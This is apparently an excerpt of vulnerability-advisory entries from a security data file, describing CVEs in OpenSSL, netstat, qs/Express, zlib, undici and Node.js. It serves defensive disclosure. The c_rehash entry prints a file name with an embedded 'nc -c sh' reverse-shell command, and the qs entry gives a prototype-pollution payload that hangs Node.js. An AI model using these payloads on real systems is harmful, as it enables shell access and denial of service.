This issue affects Virtual Terminal emulators, in which special escape characters may be used to command the terminal, and may even result in code execution, although there is no available exploit demonstrating this. The lack of RCE PoC code is due to the fact that no modern terminal emulator allows code execution via escape characters.\n\nTo exploit this vulnerability, an attacker must be able to carry out a DNS poisoning attack, so that a query from a vulnerable machine is answered with a malicious response (i.e. when trying to connect to a certain host), containing Virtual Terminal escape characters. Additionally, `netstat` must be executed at the same time from a VT emulator, so that the DNS response containing the malicious hostname is printed and interpreted by the VT as an escaped command.",

This can lead to potential truncation\nor overruns during the initialisation of some symmetric ciphers.\n\nImpact summary: A truncation in the IV can result in non-uniqueness,\nwhich could result in loss of confidentiality for some cipher modes.\n\nWhen calling EVP_EncryptInit_ex2(), EVP_DecryptInit_ex2() or\nEVP_CipherInit_ex2() the provided OSSL_PARAM array is processed after\nthe key and IV have been established.  Any alterations to the key length,\nvia the \"keylen\" parameter or the IV length, via the \"ivlen\" parameter,\nwithin the OSSL_PARAM array will not take effect as intended, potentially\ncausing truncation or overreading of these values.  The following ciphers\nand cipher modes are impacted: RC2, RC4, RC5, CCM, GCM and OCB.\n\nFor the CCM, GCM and OCB cipher modes, truncation of the IV can result in\nloss of confidentiality.  For example, when following NIST's SP 800-38D\nsection 8.2.1 guidance for constructing a deterministic IV for AES in\nGCM mode, truncation of the counter portion could lead to IV reuse.\n\nBoth truncations and overruns of the key and overruns of the IV will\nproduce incorrect results and could, in some cases, trigger a memory\nexception.  However, these issues are not currently assessed as security\ncritical.\n\nChanging the key and/or IV lengths is not considered to be a common operation\nand the vulnerable API was recently introduced. Furthermore it is likely that\napplication developers will have spotted this problem during testing since\ndecryption would fail unless both peers in the communication were similarly\nvulnerable. For these reasons we expect the probability of an application being\nvulnerable to this to be quite low. However if an application is vulnerable then\nthis issue is considered very serious.

        "summary": "The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).",

NPN is older, was never standardised and\nis deprecated in favour of ALPN. We believe that ALPN is significantly more\nwidely deployed than NPN.

        "summary": "ASN.1 strings are represented internally within OpenSSL as an ASN1_STRING structure which contains a buffer holding the string data and a field holding the buffer length. This contrasts with normal C strings which are repesented as a buffer for the string data which is terminated with a NUL (0) byte. Although not a strict requirement, ASN.1 strings that are parsed using OpenSSL's own \"d2i\" functions (and other similar parsing functions) as well as any string whose value has been set with the ASN1_STRING_set() function will additionally NUL terminate the byte array in the ASN1_STRING structure. However, it is possible for applications to directly construct valid ASN1_STRING structures which do not NUL terminate the byte array by directly setting the \"data\" and \"length\" fields in the ASN1_STRING array. This can also happen by using the ASN1_STRING_set0() function. Numerous OpenSSL functions that print ASN.1 data have been found to assume that the ASN1_STRING byte array will be NUL terminated, even though this is not guaranteed for strings that have been directly constructed. Where an application requests an ASN.1 structure to be printed, and where that ASN.1 structure contains ASN1_STRINGs that have been directly constructed by the application without NUL terminating the \"data\" field, then a read buffer overrun can occur. The same thing can also occur during name constraints processing of certificates (for example if a certificate has been directly constructed by the application instead of loading it via the OpenSSL parsing functions, and the certificate contains non NUL terminated ASN1_STRING structures). It can also occur in the X509_get1_email(), X509_REQ_get1_email() and X509_get1_ocsp() functions. If a malicious actor can cause an application to directly construct an ASN1_STRING and then process it through one of the affected OpenSSL functions then this issue could be hit. This might result in a crash (causing a Denial of Service attack). It could also result in the disclosure of private memory content...",

The application can then allocate a sufficiently sized buffer and call EVP_PKEY_decrypt() again, but this time passing a non-NULL value for the \"out\" parameter. A bug in the implementation of the SM2 decryption code means that the calculation of the buffer size required to hold the plaintext returned by the first call to EVP_PKEY_decrypt() can be smaller than the actual size required by the second call. This can lead to a buffer overflow when EVP_PKEY_decrypt() is called by the application a second time with a buffer that is too small. A malicious attacker who is able present SM2 content for decryption to an application could cause attacker chosen data to overflow the buffer by up to a maximum of 62 bytes altering the contents of other data held after the buffer, possibly changing application behaviour or causing the application to crash. The location of the buffer is application dependent but is typically heap allocated. Fixed in OpenSSL 1.1.1l (Affected 1.1.1-1.1.1k).",

The script receives a folder path as a parameter and creates a symbolic link for each each .pem, .crt, .cer, or .crl file in the folder. The created symbolic links are named by the hash value of the certificate. The `c_rehash` script is usually used in most operating systems in the `update-ca-certificates` tool that is automatically executed and runs `c_rehash` to re-hash certificates in `/etc/ssl/certs`.\n\nThe vulnerability resides in `c_rehash` script that executes an OpenSSL command with an insufficient check of the filenames, which can lead to a command injection, causing code execution.\nAn attacker that can add a certificate with a name containing a crafted payload can execute it with the permission the script was run with.\n\nExample: \n\n1. Create the certificate file with a name containing the payload:\n\n```\necho \"-----BEGIN CERTIFICATE-----\" \u003e \"hey.crt\\`nc -c sh 127.0.0.1 12345\\`\"\n```\n\n2. Wait for `update-ca-certificates` to be run or manually type `c_rehash .`\nThis example will run the `nc -c sh 127.0.0.1 12345` command.\n\nFor exploiting this vulnerability, the attacker has to be able to write certificates to `/etc/ssl/certs/` or to other paths that are configured in the `update-ca-certificates` script or to paths that are passed to `c_rehash` command line invocations. By default, the paths configured in `update-ca-certificates` are not writeable to a non-root user. So, for the CVE to be applicable, either non-default write permissions should be set to these paths or there must be another (possibly applicative) way for an attacker to write certificates to these paths.\n\nCVE-2022-2068 is a follow-up similar vulnerability that was published because similar sanitization issues were discovered when CVE-2022-1292 was reviewed.",

It combines the XEX construction and the Tweakable Block Cipher concept to provide confidentiality and data integrity.\n\nA bug was identified in the OpenSSL decryption implementation of the AES-XTS cipher for 64-bit ARM systems, which, when triggered, could result in a crash due to reading beyond the input buffer if the overflow memory is not mapped.\n\nThe ciphertext length must be `4 modulu 5`, meaning a size that leaves a remainder of 4 when divided by 5.\nFor example: 154 bytes, 1024 bytes.\n\nThis issue only affects 64-bit ARM systems (`aarch64`).",

        "summary": "A buffer overrun can be triggered in X.509 certificate verification, specifically in name constraint checking. Note that this occurs after certificate chain signature verification and requires either a CA to have signed the malicious certificate or for the application to continue certificate verification despite failure to construct a path to a trusted issuer. An attacker can craft a malicious email address to overflow four attacker-controlled bytes on the stack. This buffer overflow could result in a crash (causing a denial of service) or potentially remote code execution. Many platforms implement stack overflow protections which would mitigate against the risk of remote code execution. The risk may be further mitigated based on stack layout for any given platform/compiler. Pre-announcements of CVE-2022-3602 described this issue as CRITICAL. Further analysis based on some of the mitigating factors described above have led this to be downgraded to HIGH. Users are still encouraged to upgrade to a new version as soon as possible. In a TLS client, this can be triggered by connecting to a malicious server. In a TLS server, this can be triggered if the server requests client authentication and a malicious client connects. Fixed in OpenSSL 3.0.7 (Affected 3.0.0,3.0.1,3.0.2,3.0.3,3.0.4,3.0.5,3.0.6).",

        "summary": "There is a carry propagation bug in the MIPS32 and MIPS64 squaring procedure. Many EC algorithms are affected, including some of the TLS 1.3 default curves. Impact was not analyzed in detail, because the pre-requisites for attack are considered unlikely and include reusing private keys. Analysis suggests that attacks against RSA and DSA as a result of this defect would be very difficult to perform and are not believed likely. Attacks against DH are considered just feasible (although very difficult) because most of the work necessary to deduce information about a private key may be performed offline. The amount of resources required for such an attack would be significant. However, for an attack on TLS to be meaningful, the server would have to share the DH private key among multiple clients, which is no longer an option since CVE-2016-0701. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0.0. It was addressed in the releases of 1.1.1m and 3.0.1 on the 15th of December 2021. For the 1.0.2 release it is addressed in git commit 6fc1aaaf3 that is available to premium support customers only. It will be made available in 1.0.2zc when it is released. The issue only affects OpenSSL on MIPS platforms. Fixed in OpenSSL 3.0.1 (Affected 3.0.0). Fixed in OpenSSL 1.1.1m (Affected 1.1.1-1.1.1l). Fixed in OpenSSL 1.0.2zc-dev (Affected 1.0.2-1.0.2zb).",

This operation is required in certain programs who use OpenSSL and depend on hash values to find certificates.\n\nImproper sanitization of shell metacharacters passed to the `c_rehash` script can be exploited in a form of command injection, resulting in an attacker being able to execute arbitrary commands with the same privileges as the `c_rehash` script. The vulnerability resides in Perl's `open` function, which is used to open files, but also enables command execution if a filename contains shell metacharacters like `|`, followed by a command. The `c_rehash` script uses `open` to read certificate files, and will execute a command if a file's name is, for instance, `| {command} | cert.pem`.\nA vulnerable execution of the script would look like so: `c_rehash {dir}` where `{dir}` is a directory which contains files whose names are crafted to exploit the vulnerability, as detailed above.\n\nAlthough the `c_rehash` script is deprecated, in some operating systems it is used automatically, making such environments vulnerable to expolitation.",

Thus the contents of some of these vector registers\nare corrupted when returning to the caller. The vulnerable code is used only\non newer PowerPC processors supporting the PowerISA 2.07 instructions.\n\nThe consequences of this kind of internal application state corruption can\nbe various - from no consequences, if the calling application does not\ndepend on the contents of non-volatile XMM registers at all, to the worst\nconsequences, where the attacker could get complete control of the application\nprocess. However unless the compiler uses the vector registers for storing\npointers, the most likely consequence, if any, would be an incorrect result\nof some application dependent calculations or a crash leading to a denial of\nservice.\n\nThe POLY1305 MAC algorithm is most frequently used as part of the\nCHACHA20-POLY1305 AEAD (authenticated encryption with associated data)\nalgorithm.

When this mode is set, the client (or server, depending on the context) will check the validity of the presented certificate against a criteria set.\n\nRaw public keys (RPK) are a cryptographic method in public key infrastructure (PKI) that represent a public key without a digital certificate. Unlike certificates, which include extra details like identity and expiration, raw public keys are simpler and more efficient, making them ideal for resource-limited environments.\n\nIn OpenSSL, connections made using TLS and DTLS with RPKs may allow attackers to man-in-the-middle if clients fail to recognize a failure in server authentication. The problem only emerges when TLS clients deliberately activate RPK usage for the server, which in turn chooses to transmit an RPK instead of an X.509 certificate chain. The clients that are impacted are those that expect the handshake to fail if the server’s RPK does not align with one of the anticipated public keys, as determined by setting the verification mode to `SSL_VERIFY_PEER`.\n\nClients that enable server-side RPKs can still find out that RPK verification failed by calling the `SSL_get_verify_result()` function. If this check is made right after the handshake, clients can abort the communication in the proper cases and therefore will not be vulnerable.\n\nNote: By default, RPKs are turned off in both TLS clients and servers.",

Therefore, any calls with untrusted user input would cause the injection of arbitrary values into the Object prototype and could lead to denial-of-service.\n\nBy default, the `qs` library doesn't allow prototypes when parsing, so only non-default parsing configurations are affected. An example: `qs.parse(payload, { allowPrototypes: true });`\n\nThe issue also affects `Express.js` web framework, which uses the `qs` package to parse user-supplied query strings (from `HTTP GET` requests). That is due to `Express.js` parsing the queries with the `qs` `allowPrototypes=true` option enabled by default.\nThe vulnerable function is called when processing a request and does not have to be invoked by the developer directly.\n\nWhen treating the resulting query object that is inside `req.query` as a string or as an array, it causes Node.js to hang.  An example would be code that processes a string addition: `const newVar = req.query.testString + \"0\";`\nAnother example would be code that searches an element in an array: `req.query.testArray.indexOf(\"123\")`\n\nThe vulnerability doesn't affect the use of `qs` with default configuration (without the enabling of `allowPrototypes`).\n\nExample malicious query string payload -\n```\na[__proto__]\u0026a[__proto__]\u0026a[length]=100000000\n```",

As such, it provides the `inflateGetHeader()` method used to get the header information of a gzip archive. The header is always checked for validity, including the header CRC if present. \nWhen the `inflateGetHeader()` is called, it will make the `inflate()` method read and copy the header of a gzip in a structure passed as a parameter to the `inflateGetHeader()` method, otherwise it will discard the header. If the extra header field is big enough, it will cause the `inflate()` method to be called multiple times to get the full content of this extra field. As there is an improper extra field size check, it can cause a heap buffer overflow.\nThe vulnerability can be exploited if and only if the target program calls `inflateGetHeader()`.\nThe attacker should find a remote input that propagates to the `inflate()` method with the `inflateGetHeader()` method being called.\n\nExample:\n```\nz_stream strm;\ngz_header head;\n\nif ((r = inflateInit2(\u0026strm, stream_size)) != Z_OK)\n\tgoto fail;\nif ((r = inflateGetHeader(\u0026strm, \u0026head)) != Z_OK) {\n\tinflateEnd(\u0026strm);\n\tgoto fail;\n}\nr = inflate(\u0026strm, Z_NO_FLUSH);\n```\nThe above code is vulnerable as it is calling the `inflateGetHeader()` method and the `inflate()` method for crafter gzip header.",

Since undici handles headers more liberally than the spec, there was a disconnect from the assumptions the spec made, and undici's implementation of fetch. As such this may lead to accidental leakage of cookie to a third-party site or a malicious attacker who can control the redirection target (ie. an open redirector) to leak the cookie to the third party site.

Starting in version 4.5.0 and prior to versions 5.28.5, 6.21.1, and 7.2.3, undici uses `Math.random()` to choose the boundary for a multipart/form-data request. It is known that the output of `Math.random()` can be predicted if several of its generated values are known. If there is a mechanism in an app that sends multipart requests to an attacker-controlled website, they can use this to leak the necessary values. Therefore, an attacker can tamper with the requests going to the backend APIs if certain conditions are met. This is fixed in versions 5.28.5, 6.21.1, and 7.2.3. As a workaround, do not issue multipart requests to attacker controlled servers.",

WebCrypto is a preinstalled API for Node.js which allows users to generate cryptographic keys and encrypt and/or decrypt data.\n\nBefore generating a key, WebCrypto does an entropy check, which checks if cryptographically strong random data can be generated. However, it always assumes the check succeeds, despite it being possible for the check to fail. This in turn could lead to the keys generated to not be random (have the same value), or to be weak random data that is fully predictable because the randomization starts from a predictable state. When this happens, a malicious actor could predict the keys being generated or use their own key to decrypt victims' data, which would cause data leakage.\n\nHowever, for the entropy check to have a chance at failing, the system has to be freshly booted, or for the system to be missing either the `/dev/random` file, the `/dev/urandom` file, or the `getrandom` system call. Furthermore, even if these precondition occur and the entropy check fails, the malicious actor wouldn't be able to know, unless they've already compromised the machine or were tipped of.",

          "full_description": "[Node.js](https://nodejs.org/) is an open-source, cross-platform, back-end JavaScript runtime environment that runs on the V8 engine and executes JavaScript code outside a web browser, which was designed to build scalable network applications.\n\nWhen started with the `--inspect` switch, a Node.js process listens for a debugging client. By default, it will listen on host and port `127.0.0.1:9229`.\nNode.js process with the `--inspect` option does not properly check if an IP address that was provided by a client in the `Host` HTTP header is valid or not. Invalid IP addresses, like `1.09.0.0`, will bypass the `IsIPAddress` check.\n\nThe fix for the original issue in [CVE-2022-32212](https://nvd.nist.gov/vuln/detail/CVE-2022-32212) was partial and this new CVE is to complete the fix.\n\nIn an attack scenario when the user that runs the Node.js debugger server browses an attacker-controlled website, the website's client-side code can initiate an HTTP connection to an invalid IP address. If an attacker intercepts the request either through a Man-In-The-Middle (MITM) attack or a controlled DNS server, he could perform a DNS rebinding attack and allow the malicious website client-side code to make an HTTP request to the local Node.js debugger server. The DNS rebinding protection of the Node.js debugger will then be bypassed because the invalid IP address (that is provided in this HTTP request in the `Host` header) is not checked properly. When the attacker is now connected to the debugger mode, they can execute arbitrary code on the Node.js server as explained in the documentation: \n```\nSince the debugger has full access to the Node.js execution environment, a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process. It is important to understand the security implications of exposing the debugger port on public and private networks.\n```\n\nHowever, Chrome and Edge browsers added mitigation to [prevent DNS rebinding from accessing local private network](https://thehackernews.com/2022/01/chrome-limits-websites-access-to.html).\nBrowsers such as Firefox will still attempt to resolve this invalid octal address via DNS.",
